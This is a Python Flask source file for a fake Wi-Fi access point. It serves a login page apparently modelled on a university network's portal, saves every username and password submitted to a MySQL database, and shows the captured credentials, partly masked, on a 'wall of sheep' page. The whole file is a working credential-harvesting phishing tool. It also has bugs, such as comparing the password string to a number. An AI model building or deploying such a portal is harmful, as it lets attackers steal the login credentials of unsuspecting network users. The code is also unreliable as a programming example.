# !/usr/bin/env python
#  -*- coding: utf-8 -*-
from flask import Flask, render_template, request, redirect
from flask_sqlalchemy import SQLAlchemy
import datetime


class Config:
    DEBUG = True
    SQLALCHEMY_TRACK_MODIFICATIONS = True
    SQLALCHEMY_DATABASE_URI = "mysql+pymysql://root:root@127.0.0.1:3306/fakeap"


app = Flask(__name__)
app.config.from_object(Config)
db = SQLAlchemy()
db.init_app(app)


class Wifi(db.Model):
    id = db.Column(db.Integer(), primary_key=True, autoincrement=True)
    remote_addr = db.Column(db.String(255))
    remote_user = db.Column(db.String(255))
    username = db.Column(db.String(255))
    password = db.Column(db.String(20))
    create_time = db.Column(db.DateTime())

    def __repr__(self):
        return "<PostData '%s'>" % self.title


@app.route('/', methods=['GET', 'POST'])
@app.route('/login.html', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        post_data = request.form.to_dict()
        if post_data and len(post_data['username']) > 5 and post_data['password'] > 5:
            data = Wifi()
            data.remote_user = request.remote_user
            data.remote_addr = request.remote_addr
            data.username = post_data['username']
            data.password = post_data['password']
            data.create_time = datetime.datetime.now()
            db.session.add(data)
            db.session.commit()

    return render_template('bjtu_wifi_old.html')


@app.errorhandler(404)
def handle404(e):
    return redirect('/login.html')


@app.route('/sheep')
def sheep():
    data = Wifi.query.all()
    for each in data:
        each.password = each.password[0] + ''.join(['*' for i in range(len(each.password) - 2)]) + each.password[-1]
    return render_template('wall_of_sheep.html', data=data)
